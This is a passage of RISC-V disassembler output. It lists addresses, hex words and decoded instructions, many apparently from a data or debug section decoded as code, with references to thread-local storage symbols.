     8b4:	2000                	fld	fs0,0(s0)
     8b6:	00000557          	0x557
     8ba:	4702ff07          	0x4702ff07
     8be:	0004                	0x4
     8c0:	0300                	addi	s0,sp,384
     8c2:	0032                	c.slli	zero,0xc
     8c4:	0000                	unimp
     8c6:	1808                	addi	a0,sp,48
     8c8:	0034                	addi	a3,sp,8
     8ca:	0000                	unimp
     8cc:	00009503          	lh	a0,0(ra)
     8d0:	0800                	addi	s0,sp,16
     8d2:	6238                	ld	a4,64(a2)
     8d4:	0000                	unimp
     8d6:	0300                	addi	s0,sp,384
     8d8:	0394                	addi	a3,sp,448
     8da:	0000                	unimp
     8dc:	3c08                	fld	fa0,56(s0)
     8de:	0074                	addi	a3,sp,12
     8e0:	0000                	unimp
     8e2:	c108                	sw	a0,0(a0)
     8e4:	0008                	0x8
     8e6:	f500                	sd	s0,40(a0)
     8e8:	0008                	0x8
     8ea:	2100                	fld	fs0,0(a0)
     8ec:	007f                	0x7f
     8ee:	0000                	unimp
     8f0:	3fff                	0x3fff
     8f2:	0001                	nop
     8f4:	2200                	fld	fs0,0(a2)
     8f6:	03d4                	addi	a3,sp,452
     8f8:	0000                	unimp
     8fa:	3901                	addiw	s2,s2,-32
     8fc:	08e2                	slli	a7,a7,0x18
     8fe:	0000                	unimp
     900:	0309                	addi	t1,t1,2
     902:	2c00                	fld	fs0,24(s0)
     904:	8000                	0x8000
     906:	0000                	unimp
     908:	0000                	unimp
     90a:	0922                	slli	s2,s2,0x8
     90c:	0006                	c.slli	zero,0x1
     90e:	0200                	addi	s0,sp,256
     910:	0008d70f          	0x8d70f
     914:	0900                	addi	s0,sp,144
     916:	002be003          	lwu	zero,2(s7)
     91a:	0080                	addi	s0,sp,64
     91c:	0000                	unimp
     91e:	0800                	addi	s0,sp,16
     920:	08c1                	addi	a7,a7,16
     922:	0000                	unimp
     924:	0000092f          	0x92f
     928:	7f09                	lui	t5,0xfffe2
     92a:	0000                	unimp
     92c:	3f00                	fld	fs0,56(a4)
     92e:	2200                	fld	fs0,0(a2)
     930:	000c                	0xc
     932:	0000                	unimp
     934:	1002                	c.slli	zero,0x20
     936:	091f 0000 0309      	0x3090000091f
     93c:	6c00                	ld	s0,24(s0)
     93e:	8001                	srli	s0,s0,0x0
     940:	0000                	unimp
     942:	0000                	unimp
     944:	c108                	sw	a0,0(a0)
     946:	0008                	0x8
     948:	5400                	lw	s0,40(s0)
     94a:	0009                	c.nop	2
     94c:	0900                	addi	s0,sp,144
     94e:	007f                	0x7f
     950:	0000                	unimp
     952:	009f 8422 0003      	0x38422009f
     958:	0200                	addi	s0,sp,256
     95a:	4411                	li	s0,4
     95c:	0009                	c.nop	2
     95e:	0900                	addi	s0,sp,144
     960:	002b4003          	lbu	zero,2(s6) # 1777e <_tbss_end+0x176fa>
     964:	0080                	addi	s0,sp,64
     966:	0000                	unimp
     968:	2200                	fld	fs0,0(a2)
     96a:	0314                	addi	a3,sp,384
     96c:	0000                	unimp
     96e:	1202                	slli	tp,tp,0x20
     970:	091f 0000 0309      	0x3090000091f
     976:	6c40                	ld	s0,152(s0)
     978:	8001                	srli	s0,s0,0x0
     97a:	0000                	unimp
     97c:	0000                	unimp
     97e:	c108                	sw	a0,0(a0)
     980:	0008                	0x8
     982:	8f00                	0x8f00
     984:	0009                	c.nop	2
     986:	2300                	fld	fs0,0(a4)
     988:	007f                	0x7f
     98a:	0000                	unimp
     98c:	3fff                	0x3fff
     98e:	2200                	fld	fs0,0(a2)
     990:	0000038b          	0x38b
     994:	1302                	slli	t1,t1,0x20
     996:	097e                	slli	s2,s2,0x1f
     998:	0000                	unimp
     99a:	0309                	addi	t1,t1,2
     99c:	6c80                	ld	s0,24(s1)
     99e:	8001                	srli	s0,s0,0x0
     9a0:	0000                	unimp
     9a2:	0000                	unimp
     9a4:	5422                	lw	s0,40(sp)
     9a6:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     9aa:	7e14                	ld	a3,56(a2)
     9ac:	0005                	c.nop	1
     9ae:	0900                	addi	s0,sp,144
     9b0:	002be803          	lwu	a6,2(s7)
     9b4:	0080                	addi	s0,sp,64
     9b6:	0000                	unimp
     9b8:	2400                	fld	fs0,8(s0)
     9ba:	00000613          	li	a2,0
     9be:	4402                	lw	s0,0(sp)
     9c0:	0054                	addi	a3,sp,4
     9c2:	0000                	unimp
     9c4:	1250                	addi	a2,sp,292
     9c6:	8000                	0x8000
     9c8:	0000                	unimp
     9ca:	0000                	unimp
     9cc:	039a                	slli	t2,t2,0x6
     9ce:	0000                	unimp
     9d0:	0000                	unimp
     9d2:	0000                	unimp
     9d4:	9c01                	subw	s0,s0,s0
     9d6:	00000baf          	0xbaf
     9da:	4125                	li	sp,9
     9dc:	0005                	c.nop	1
     9de:	0200                	addi	s0,sp,256
     9e0:	d745                	beqz	a4,988 <_tbss_end+0x904>
     9e2:	0008                	0x8
     9e4:	0300                	addi	s0,sp,384
     9e6:	a891                	j	a3a <_tbss_end+0x9b6>
     9e8:	257f                	0x257f
     9ea:	0342                	slli	t1,t1,0x10
     9ec:	0000                	unimp
     9ee:	4602                	lw	a2,0(sp)
     9f0:	000008d7          	0x8d7
     9f4:	7fa09103          	lh	sp,2042(ra)
     9f8:	e825                	bnez	s0,a68 <_tbss_end+0x9e4>
     9fa:	0005                	c.nop	1
     9fc:	0200                	addi	s0,sp,256
     9fe:	0008d747          	fmsub.s	fa4,fa7,ft0,ft0,unknown
     a02:	0300                	addi	s0,sp,384
     a04:	9091                	srli	s1,s1,0x24
     a06:	257f                	0x257f
     a08:	051e                	slli	a0,a0,0x7
     a0a:	0000                	unimp
     a0c:	4702                	lw	a4,0(sp)
     a0e:	000008d7          	0x8d7
     a12:	7f809103          	lh	sp,2040(ra)
     a16:	9a25                	andi	a2,a2,-23
     a18:	0001                	nop
     a1a:	0200                	addi	s0,sp,256
     a1c:	0008d747          	fmsub.s	fa4,fa7,ft0,ft0,unknown
     a20:	0300                	addi	s0,sp,384
     a22:	f891                	bnez	s1,936 <_tbss_end+0x8b2>
     a24:	257e                	fld	fa0,472(sp)
     a26:	0126                	slli	sp,sp,0x9
     a28:	0000                	unimp
     a2a:	4802                	lw	a6,0(sp)
     a2c:	000008d7          	0x8d7
     a30:	9102                	jalr	sp
     a32:	2568                	fld	fa0,200(a0)
     a34:	0044                	addi	s1,sp,4
     a36:	0000                	unimp
     a38:	4902                	lw	s2,0(sp)
     a3a:	000008d7          	0x8d7
     a3e:	7ee89103          	lh	sp,2030(a7)
     a42:	c025                	beqz	s0,aa2 <_tbss_end+0xa1e>
     a44:	0000                	unimp
     a46:	0200                	addi	s0,sp,256
     a48:	d749                	beqz	a4,9d2 <_tbss_end+0x94e>
     a4a:	0008                	0x8
     a4c:	0300                	addi	s0,sp,384
     a4e:	f091                	bnez	s1,952 <_tbss_end+0x8ce>
     a50:	257e                	fld	fa0,472(sp)
     a52:	00000103          	lb	sp,0(zero) # 0 <_tdata_begin>
     a56:	4a02                	lw	s4,0(sp)
     a58:	08c1                	addi	a7,a7,16
     a5a:	0000                	unimp
     a5c:	9102                	jalr	sp
     a5e:	05fc2567          	0x5fc2567
     a62:	0000                	unimp
     a64:	4b02                	lw	s6,0(sp)
     a66:	00000baf          	0xbaf
     a6a:	0309                	addi	t1,t1,2
     a6c:	ac80                	fsd	fs0,24(s1)
     a6e:	8001                	srli	s0,s0,0x0
     a70:	0000                	unimp
     a72:	0000                	unimp
     a74:	b426                	fsd	fs1,40(sp)
     a76:	0012                	c.slli	zero,0x4
     a78:	0080                	addi	s0,sp,64
     a7a:	0000                	unimp
     a7c:	2a00                	fld	fs0,16(a2)
     a7e:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
     a82:	0000                	unimp
     a84:	2700                	fld	fs0,8(a4)
     a86:	656c                	ld	a1,200(a0)
     a88:	006e                	c.slli	zero,0x1b
     a8a:	5102                	lw	sp,32(sp)
     a8c:	000008d7          	0x8d7
     a90:	9102                	jalr	sp
     a92:	2658                	fld	fa4,136(a2)
     a94:	12ba                	slli	t0,t0,0x2e
     a96:	8000                	0x8000
     a98:	0000                	unimp
     a9a:	0000                	unimp
     a9c:	0310                	addi	a2,sp,384
     a9e:	0000                	unimp
     aa0:	0000                	unimp
     aa2:	0000                	unimp
     aa4:	1c25                	addi	s8,s8,-23
     aa6:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     aaa:	bf92                	fsd	ft4,504(sp)
     aac:	0300000b          	0x300000b
     ab0:	e091                	bnez	s1,ab4 <_tbss_end+0xa30>
     ab2:	257e                	fld	fa0,472(sp)
     ab4:	00a8                	addi	a0,sp,72
     ab6:	0000                	unimp
     ab8:	9302                	jalr	t1
     aba:	00000bcf          	fnmadd.s	fs7,ft0,ft0,ft0,rne
     abe:	7ed09103          	lh	sp,2029(ra)
     ac2:	ba28                	fsd	fa0,112(a2)
     ac4:	0012                	c.slli	zero,0x4
     ac6:	0080                	addi	s0,sp,64
     ac8:	0000                	unimp
     aca:	3000                	fld	fs0,32(s0)
     acc:	0000                	unimp
     ace:	0000                	unimp
     ad0:	0000                	unimp
     ad2:	e600                	sd	s0,8(a2)
     ad4:	000a                	c.slli	zero,0x2
     ad6:	2500                	fld	fs0,8(a0)
     ad8:	04f1                	addi	s1,s1,28
     ada:	0000                	unimp
     adc:	5402                	lw	s0,32(sp)
     ade:	000008d7          	0x8d7
     ae2:	9102                	jalr	sp
     ae4:	0050                	addi	a2,sp,4
     ae6:	ea26                	sd	s1,272(sp)
     ae8:	0012                	c.slli	zero,0x4
     aea:	0080                	addi	s0,sp,64
     aec:	0000                	unimp
     aee:	c000                	sw	s0,0(s0)
     af0:	0001                	nop
     af2:	0000                	unimp
     af4:	0000                	unimp
     af6:	2500                	fld	fs0,8(a0)
     af8:	0014                	0x14
     afa:	0000                	unimp
     afc:	5902                	lw	s2,32(sp)
     afe:	000008d7          	0x8d7
     b02:	9102                	jalr	sp
     b04:	2848                	fld	fa0,144(s0)
     b06:	1300                	addi	s0,sp,416
     b08:	8000                	0x8000
     b0a:	0000                	unimp
     b0c:	0000                	unimp
     b0e:	0100                	addi	s0,sp,128
     b10:	0000                	unimp
     b12:	0000                	unimp
     b14:	0000                	unimp
     b16:	0b46                	slli	s6,s6,0x11
     b18:	0000                	unimp
     b1a:	02006a27          	0x2006a27
     b1e:	cc5e                	sw	s7,24(sp)
     b20:	0008                	0x8
     b22:	0200                	addi	s0,sp,256
     b24:	4091                	li	ra,4
     b26:	9e26                	add	t3,t3,s1
     b28:	00800013          	li	zero,8
     b2c:	0000                	unimp
     b2e:	1a00                	addi	s0,sp,304
     b30:	0000                	unimp
     b32:	0000                	unimp
     b34:	0000                	unimp
     b36:	2700                	fld	fs0,8(a4)
     b38:	6d02006b          	0x6d02006b
     b3c:	000008d7          	0x8d7
     b40:	7fb89103          	lh	sp,2043(a7)
     b44:	0000                	unimp
     b46:	0026                	c.slli	zero,0x9
     b48:	0014                	0x14
     b4a:	0080                	addi	s0,sp,64
     b4c:	0000                	unimp
     b4e:	9600                	0x9600
     b50:	0000                	unimp
     b52:	0000                	unimp
     b54:	0000                	unimp
     b56:	2700                	fld	fs0,8(a4)
     b58:	0069                	c.nop	26
     b5a:	8602                	jr	a2
     b5c:	000008d7          	0x8d7
     b60:	7fb09103          	lh	sp,2043(ra)
     b64:	0628                	addi	a0,sp,776
     b66:	0014                	0x14
     b68:	0080                	addi	s0,sp,64
     b6a:	0000                	unimp
     b6c:	0c00                	addi	s0,sp,528
     b6e:	0000                	unimp
     b70:	0000                	unimp
     b72:	0000                	unimp
     b74:	8900                	0x8900
     b76:	2500000b          	0x2500000b
     b7a:	01b8                	addi	a4,sp,200
     b7c:	0000                	unimp
     b7e:	8702                	jr	a4
     b80:	007f                	0x7f
     b82:	0000                	unimp
     b84:	7f989103          	lh	sp,2041(a7)
     b88:	2600                	fld	fs0,8(a2)
     b8a:	1434                	addi	a3,sp,552
     b8c:	8000                	0x8000
     b8e:	0000                	unimp
     b90:	0000                	unimp
     b92:	000c                	0xc
     b94:	0000                	unimp
     b96:	0000                	unimp
     b98:	0000                	unimp
     b9a:	b825                	j	3d2 <_tbss_end+0x34e>
     b9c:	0001                	nop
     b9e:	0200                	addi	s0,sp,256
     ba0:	7f89                	lui	t6,0xfffe2
     ba2:	0000                	unimp
     ba4:	0300                	addi	s0,sp,384
     ba6:	8891                	andi	s1,s1,4
     ba8:	007f                	0x7f
     baa:	0000                	unimp
     bac:	0000                	unimp
     bae:	0800                	addi	s0,sp,16
     bb0:	000008d7          	0x8d7
     bb4:	00000bbf 00007f09 	0x7f0900000bbf
     bbc:	ff00                	sd	s0,56(a4)
     bbe:	0800                	addi	s0,sp,16
     bc0:	08c1                	addi	a7,a7,16
     bc2:	0000                	unimp
     bc4:	00000bcf          	fnmadd.s	fs7,ft0,ft0,ft0,rne
     bc8:	7f09                	lui	t5,0xfffe2
     bca:	0000                	unimp
     bcc:	0100                	addi	s0,sp,128
     bce:	0800                	addi	s0,sp,16
     bd0:	000008d7          	0x8d7
     bd4:	0bdf 0000 7f09      	0x7f0900000bdf
     bda:	0000                	unimp
     bdc:	0100                	addi	s0,sp,128
     bde:	2900                	fld	fs0,16(a0)
     be0:	029f 0000 4002      	0x40020000029f
     be6:	1212                	slli	tp,tp,0x24
     be8:	8000                	0x8000
     bea:	0000                	unimp
     bec:	0000                	unimp
     bee:	003e                	c.slli	zero,0xf
     bf0:	0000                	unimp
     bf2:	0000                	unimp
     bf4:	0000                	unimp
     bf6:	9c01                	subw	s0,s0,s0
     bf8:	0c19                	addi	s8,s8,6
     bfa:	0000                	unimp
     bfc:	692a                	ld	s2,136(sp)
     bfe:	7864                	ld	s1,240(s0)
     c00:	0200                	addi	s0,sp,256
     c02:	d740                	sw	s0,44(a4)
     c04:	0008                	0x8
     c06:	0200                	addi	s0,sp,256
     c08:	5891                	li	a7,-28
     c0a:	0325                	addi	t1,t1,9
     c0c:	0001                	nop
     c0e:	0200                	addi	s0,sp,256
     c10:	c141                	beqz	a0,c90 <_tbss_end+0xc0c>
     c12:	0008                	0x8
     c14:	0200                	addi	s0,sp,256
     c16:	6f91                	lui	t6,0x4
     c18:	2b00                	fld	fs0,16(a4)
     c1a:	00000233          	add	tp,zero,zero
     c1e:	3602                	fld	fa2,32(sp)
     c20:	1202                	slli	tp,tp,0x20
     c22:	8000                	0x8000
     c24:	0000                	unimp
     c26:	0000                	unimp
     c28:	0010                	0x10
     c2a:	0000                	unimp
     c2c:	0000                	unimp
     c2e:	0000                	unimp
     c30:	9c01                	subw	s0,s0,s0
     c32:	2c29                	addiw	s8,s8,10
     c34:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     c38:	1620                	addi	s0,sp,808
     c3a:	0011                	c.nop	4
     c3c:	0080                	addi	s0,sp,64
     c3e:	0000                	unimp
     c40:	ec00                	sd	s0,24(s0)
     c42:	0000                	unimp
     c44:	0000                	unimp
     c46:	0000                	unimp
     c48:	0100                	addi	s0,sp,128
     c4a:	a69c                	fsd	fa5,8(a3)
     c4c:	000c                	0xc
     c4e:	2c00                	fld	fs0,24(s0)
     c50:	021e                	slli	tp,tp,0x7
     c52:	0000                	unimp
     c54:	2002                	fld	ft0,0(sp)
     c56:	0ca6                	slli	s9,s9,0x9
     c58:	0000                	unimp
     c5a:	9102                	jalr	sp
     c5c:	2c58                	fld	fa4,152(s0)
     c5e:	000001fb          	0x1fb
     c62:	2002                	fld	ft0,0(sp)
     c64:	000008d7          	0x8d7
     c68:	9102                	jalr	sp
     c6a:	2c50                	fld	fa2,152(s0)
     c6c:	04f6                	slli	s1,s1,0x1d
     c6e:	0000                	unimp
     c70:	2002                	fld	ft0,0(sp)
     c72:	0cac                	addi	a1,sp,600
     c74:	0000                	unimp
     c76:	9102                	jalr	sp
     c78:	2c48                	fld	fa0,152(s0)
     c7a:	0156                	slli	sp,sp,0x15
     c7c:	0000                	unimp
     c7e:	2002                	fld	ft0,0(sp)
     c80:	0ca6                	slli	s9,s9,0x9
     c82:	0000                	unimp
     c84:	9102                	jalr	sp
     c86:	2640                	fld	fs0,136(a2)
     c88:	113e                	slli	sp,sp,0x2f
     c8a:	8000                	0x8000
     c8c:	0000                	unimp
     c8e:	0000                	unimp
     c90:	00bc                	addi	a5,sp,72
     c92:	0000                	unimp
     c94:	0000                	unimp
     c96:	0000                	unimp
     c98:	02006927          	0x2006927
     c9c:	d724                	sw	s1,104(a4)
     c9e:	0008                	0x8
     ca0:	0200                	addi	s0,sp,256
     ca2:	6891                	lui	a7,0x4
     ca4:	0000                	unimp
     ca6:	08d7080f          	0x8d7080f
     caa:	0000                	unimp
     cac:	08c1080f          	0x8c1080f
     cb0:	0000                	unimp
     cb2:	582d                	li	a6,-21
     cb4:	0002                	c.slli	zero,0x0
     cb6:	0100                	addi	s0,sp,128
     cb8:	4846                	lw	a6,80(sp)
     cba:	0010                	0x10
     cbc:	0080                	addi	s0,sp,64
     cbe:	0000                	unimp
     cc0:	ce00                	sw	s0,24(a2)
     cc2:	0000                	unimp
     cc4:	0000                	unimp
     cc6:	0000                	unimp
     cc8:	0100                	addi	s0,sp,128
     cca:	2c9c                	fld	fa5,24(s1)
     ccc:	008e                	slli	ra,ra,0x3
     cce:	0000                	unimp
     cd0:	4601                	li	a2,0
     cd2:	000008d7          	0x8d7
     cd6:	7fa89103          	lh	sp,2042(a7) # 47fa <_tbss_end+0x4776>
     cda:	732a                	ld	t1,168(sp)
     cdc:	007a                	c.slli	zero,0x1e
     cde:	4601                	li	a2,0
     ce0:	000008d7          	0x8d7
     ce4:	7fa09103          	lh	sp,2042(ra)
     ce8:	b925                	j	920 <_tbss_end+0x89c>
     cea:	01000003          	lb	zero,16(zero) # 10 <_tdata_begin+0x10>
     cee:	d74c                	sw	a1,44(a4)
     cf0:	0008                	0x8
     cf2:	0200                	addi	s0,sp,256
     cf4:	6891                	lui	a7,0x4
     cf6:	0325                	addi	t1,t1,9
     cf8:	0001                	nop
     cfa:	0100                	addi	s0,sp,128
     cfc:	0008c15b          	0x8c15b
     d00:	0200                	addi	s0,sp,256
     d02:	5791                	li	a5,-28
     d04:	6a25                	lui	s4,0x9
     d06:	0005                	c.nop	1
     d08:	0100                	addi	s0,sp,128
     d0a:	d761                	beqz	a4,cd2 <_tbss_end+0xc4e>
     d0c:	0008                	0x8
     d0e:	0200                	addi	s0,sp,256
     d10:	4891                	li	a7,4
     d12:	a026                	fsd	fs1,0(sp)
     d14:	0010                	0x10
     d16:	0080                	addi	s0,sp,64
     d18:	0000                	unimp
     d1a:	6e00                	ld	s0,24(a2)
     d1c:	0000                	unimp
     d1e:	0000                	unimp
     d20:	0000                	unimp
     d22:	2700                	fld	fs0,8(a4)
     d24:	0069                	c.nop	26
     d26:	6401                	0x6401
     d28:	000008d7          	0x8d7
     d2c:	9102                	jalr	sp
     d2e:	2660                	fld	fs0,200(a2)
     d30:	10a6                	slli	ra,ra,0x29
     d32:	8000                	0x8000
     d34:	0000                	unimp
     d36:	0000                	unimp
     d38:	0052                	c.slli	zero,0x14
     d3a:	0000                	unimp
     d3c:	0000                	unimp
     d3e:	0000                	unimp
     d40:	3a25                	addiw	s4,s4,-23
     d42:	0000                	unimp
     d44:	0100                	addi	s0,sp,128
     d46:	0008d767          	0x8d767
     d4a:	0200                	addi	s0,sp,256
     d4c:	4091                	li	ra,4
     d4e:	bc26                	fsd	fs1,56(sp)
     d50:	0010                	0x10
     d52:	0080                	addi	s0,sp,64
     d54:	0000                	unimp
     d56:	3c00                	fld	fs0,56(s0)
     d58:	0000                	unimp
     d5a:	0000                	unimp
     d5c:	0000                	unimp
     d5e:	2700                	fld	fs0,8(a4)
     d60:	006a                	c.slli	zero,0x1a
     d62:	6b01                	0x6b01
     d64:	000008d7          	0x8d7
     d68:	9102                	jalr	sp
     d6a:	2658                	fld	fa4,136(a2)
     d6c:	10c2                	slli	ra,ra,0x30
     d6e:	8000                	0x8000
     d70:	0000                	unimp
     d72:	0000                	unimp
     d74:	0022                	c.slli	zero,0x8
     d76:	0000                	unimp
     d78:	0000                	unimp
     d7a:	0000                	unimp
     d7c:	df25                	beqz	a4,cf4 <_tbss_end+0xc70>
     d7e:	0000                	unimp
     d80:	0100                	addi	s0,sp,128
     d82:	d76e                	sw	s11,172(sp)
     d84:	0008                	0x8
     d86:	0300                	addi	s0,sp,384
     d88:	b891                	j	5dc <_tbss_end+0x558>
     d8a:	007f                	0x7f
     d8c:	0000                	unimp
     d8e:	0000                	unimp
     d90:	2a00                	fld	fs0,16(a2)
     d92:	0000                	unimp
     d94:	0200                	addi	s0,sp,256
     d96:	6200                	ld	s0,0(a2)
     d98:	0002                	c.slli	zero,0x0
     d9a:	0800                	addi	s0,sp,16
     d9c:	3701                	addiw	a4,a4,-32
     d9e:	0004                	0x4
     da0:	0000                	unimp
     da2:	0000                	unimp
     da4:	0080                	addi	s0,sp,64
     da6:	0000                	unimp
     da8:	c600                	sw	s0,8(a2)
     daa:	0001                	nop
     dac:	0080                	addi	s0,sp,64
     dae:	0000                	unimp
     db0:	2200                	fld	fs0,0(a2)
     db2:	0006                	c.slli	zero,0x1
     db4:	2c00                	fld	fs0,24(s0)
     db6:	0006                	c.slli	zero,0x1
     db8:	5500                	lw	s0,40(a0)
     dba:	0006                	c.slli	zero,0x1
     dbc:	0100                	addi	s0,sp,128
     dbe:	2a80                	fld	fs0,16(a3)
     dc0:	0000                	unimp
     dc2:	0200                	addi	s0,sp,256
     dc4:	7600                	ld	s0,40(a2)
     dc6:	0002                	c.slli	zero,0x0
     dc8:	0800                	addi	s0,sp,16
     dca:	2f01                	sext.w	t5,t5
     dcc:	0008                	0x8
     dce:	ea00                	sd	s0,16(a2)
     dd0:	0015                	c.nop	5
     dd2:	0080                	addi	s0,sp,64
     dd4:	0000                	unimp
     dd6:	1800                	addi	s0,sp,48
     dd8:	0016                	c.slli	zero,0x5
     dda:	0080                	addi	s0,sp,64
     ddc:	0000                	unimp
     dde:	6100                	ld	s0,0(a0)
     de0:	0006                	c.slli	zero,0x1
     de2:	2c00                	fld	fs0,24(s0)
     de4:	0006                	c.slli	zero,0x1
     de6:	5500                	lw	s0,40(a0)
     de8:	0006                	c.slli	zero,0x1
     dea:	0100                	addi	s0,sp,128
     dec:	c680                	sw	s0,8(a3)
     dee:	04000017          	auipc	zero,0x4000
     df2:	8a00                	0x8a00
     df4:	0002                	c.slli	zero,0x0
     df6:	0800                	addi	s0,sp,16
     df8:	8a01                	andi	a2,a2,0
     dfa:	0008                	0x8
     dfc:	0c00                	addi	s0,sp,528
     dfe:	0734                	addi	a3,sp,904
     e00:	0000                	unimp
     e02:	0761                	addi	a4,a4,24
     e04:	0000                	unimp
     e06:	1618                	addi	a4,sp,800
     e08:	8000                	0x8000
     e0a:	0000                	unimp
     e0c:	0000                	unimp
     e0e:	1214                	addi	a3,sp,288
     e10:	0000                	unimp
     e12:	0000                	unimp
     e14:	0000                	unimp
     e16:	000008bb          	addw	a7,zero,zero
     e1a:	0102                	slli	sp,sp,0x0
     e1c:	c806                	sw	ra,16(sp)
     e1e:	02000003          	lb	zero,32(zero) # 4000e0e <_tbss_end+0x4000d8a>
     e22:	0801                	addi	a6,a6,0
     e24:	03c6                	slli	t2,t2,0x11
     e26:	0000                	unimp
     e28:	0202                	slli	tp,tp,0x0
     e2a:	eb05                	bnez	a4,e5a <_tbss_end+0xdd6>
     e2c:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     e30:	0702                	slli	a4,a4,0x0
     e32:	023c                	addi	a5,sp,264
     e34:	0000                	unimp
     e36:	69050403          	lb	s0,1680(a0)
     e3a:	746e                	ld	s0,248(sp)
     e3c:	0400                	addi	s0,sp,512
     e3e:	0049                	c.nop	18
     e40:	0000                	unimp
     e42:	5005                	c.li	zero,-31
     e44:	0000                	unimp
     e46:	0500                	addi	s0,sp,640
     e48:	0049                	c.nop	18
     e4a:	0000                	unimp
     e4c:	0402                	slli	s0,s0,0x0
     e4e:	00007807          	0x7807
     e52:	0200                	addi	s0,sp,256
     e54:	0508                	addi	a0,sp,640
     e56:	00ee                	slli	ra,ra,0x1b
     e58:	0000                	unimp
     e5a:	9206                	add	tp,tp,ra
     e5c:	04000003          	lb	zero,64(zero) # 40 <buf.2990>
     e60:	1969                	addi	s2,s2,-6
     e62:	0079                	c.nop	30
     e64:	0000                	unimp
     e66:	0802                	slli	a6,a6,0x0
     e68:	00007307          	0x7307
     e6c:	0600                	addi	s0,sp,768
     e6e:	0840                	addi	s0,sp,20
     e70:	0000                	unimp
     e72:	e804                	sd	s1,16(s0)
     e74:	791a                	ld	s2,416(sp)
     e76:	0000                	unimp
     e78:	0600                	addi	s0,sp,768
     e7a:	0394                	addi	a3,sp,448
     e7c:	0000                	unimp
     e7e:	3c05                	addiw	s8,s8,-31
     e80:	6d14                	ld	a3,24(a0)
     e82:	0000                	unimp
     e84:	0400                	addi	s0,sp,512
     e86:	008c                	addi	a1,sp,64
     e88:	0000                	unimp
     e8a:	4206                	lw	tp,64(sp)
     e8c:	0008                	0x8
     e8e:	0500                	addi	s0,sp,640
     e90:	1552                	slli	a0,a0,0x34
     e92:	0080                	addi	s0,sp,64
     e94:	0000                	unimp
     e96:	9d05                	subw	a0,a0,s1
     e98:	0000                	unimp
     e9a:	0600                	addi	s0,sp,768
     e9c:	0599                	addi	a1,a1,6
     e9e:	0000                	unimp
     ea0:	d106                	sw	ra,160(sp)
     ea2:	00007917          	auipc	s2,0x7
     ea6:	0200                	addi	s0,sp,256
     ea8:	0508                	addi	a0,sp,640
     eaa:	00e9                	addi	ra,ra,26
     eac:	0000                	unimp
     eae:	1002                	c.slli	zero,0x20
     eb0:	3604                	fld	fs1,40(a2)
     eb2:	07000003          	lb	zero,112(zero) # 70 <buf.2990+0x30>
     eb6:	028a                	slli	t0,t0,0x2
     eb8:	0000                	unimp
     eba:	5e06                	lw	t3,96(sp)
     ebc:	1701                	addi	a4,a4,-32
     ebe:	005f 0000 7d06      	0x7d060000005f
     ec4:	07000003          	lb	zero,112(zero) # 70 <buf.2990+0x30>
     ec8:	0e2e                	slli	t3,t3,0xb
     eca:	0066                	c.slli	zero,0x19
     ecc:	0000                	unimp
     ece:	d606                	sw	ra,44(sp)
     ed0:	0004                	0x4
     ed2:	0700                	addi	s0,sp,896
     ed4:	0e74                	addi	a3,sp,796
     ed6:	0066                	c.slli	zero,0x19
     ed8:	0000                	unimp
     eda:	9706                	add	a4,a4,ra
     edc:	0005                	c.nop	1
     ede:	0700                	addi	s0,sp,896
     ee0:	00661793          	slli	a5,a2,0x6
     ee4:	0000                	unimp
     ee6:	0408                	addi	a0,sp,512
     ee8:	1b03a507          	flw	fa0,432(t2)
     eec:	0001                	nop
     eee:	0900                	addi	s0,sp,144
     ef0:	0284                	addi	s1,sp,320
     ef2:	0000                	unimp
     ef4:	c80ca707          	flw	fa4,-896(s9)
     ef8:	0000                	unimp
     efa:	0900                	addi	s0,sp,144
     efc:	00000207          	0x207
     f00:	1b13a807          	flw	fa6,433(t2)
     f04:	0001                	nop
     f06:	0000                	unimp
     f08:	340a                	fld	fs0,160(sp)
     f0a:	0000                	unimp
     f0c:	2b00                	fld	fs0,16(a4)
     f0e:	0001                	nop
     f10:	0b00                	addi	s0,sp,400
     f12:	0079                	c.nop	30
     f14:	0000                	unimp
     f16:	080c0003          	lb	zero,128(s8) # 187e2 <_tbss_end+0x1875e>
     f1a:	4f09a207          	flw	ft4,1264(s3)
     f1e:	0001                	nop
     f20:	0d00                	addi	s0,sp,656
     f22:	0491                	addi	s1,s1,4
     f24:	0000                	unimp
     f26:	4907a407          	flw	fs0,1168(a5)
     f2a:	0000                	unimp
     f2c:	0000                	unimp
     f2e:	990d                	andi	a0,a0,-29
     f30:	0004                	0x4
     f32:	0700                	addi	s0,sp,896
     f34:	05a9                	addi	a1,a1,10
     f36:	00f9                	addi	ra,ra,30
     f38:	0000                	unimp
     f3a:	0004                	0x4
     f3c:	1306                	slli	t1,t1,0x21
     f3e:	0004                	0x4
     f40:	0700                	addi	s0,sp,896
     f42:	03aa                	slli	t2,t2,0xa
     f44:	0000012b          	0x12b
     f48:	080e                	slli	a6,a6,0x3
     f4a:	095f080f          	0x95f080f
     f4e:	0000                	unimp
     f50:	3906                	fld	fs2,96(sp)
     f52:	0005                	c.nop	1
     f54:	0800                	addi	s0,sp,16
     f56:	1919                	addi	s2,s2,-26
     f58:	005f 0000 a706      	0xa7060000005f
     f5e:	09000003          	lb	zero,144(zero) # 90 <_tbss_end+0xc>
     f62:	0d0c                	addi	a1,sp,656
     f64:	0049                	c.nop	18
     f66:	0000                	unimp
     f68:	be06                	fsd	ft1,312(sp)
     f6a:	0001                	nop
     f6c:	0800                	addi	s0,sp,16
     f6e:	016f1b23          	sh	s6,22(t5) # fffffffffffe2016 <_end+0xffffffff7ffc6b56>
     f72:	0000                	unimp
     f74:	cf10                	sw	a2,24(a4)
     f76:	0001                	nop
     f78:	2000                	fld	fs0,0(s0)
     f7a:	3408                	fld	fa0,40(s0)
     f7c:	e108                	sd	a0,0(a0)
     f7e:	0001                	nop
     f80:	0d00                	addi	s0,sp,656
     f82:	0434                	addi	a3,sp,520
     f84:	0000                	unimp
     f86:	3608                	fld	fa0,40(a2)
     f88:	0001e113          	ori	sp,gp,0
     f8c:	0000                	unimp
     f8e:	5f11                	li	t5,-28
     f90:	3708006b          	0x3708006b
     f94:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
     f98:	0800                	addi	s0,sp,16
     f9a:	7c0d                	lui	s8,0xfffe3
     f9c:	0004                	0x4
     f9e:	0800                	addi	s0,sp,16
     fa0:	00490b37          	lui	s6,0x490
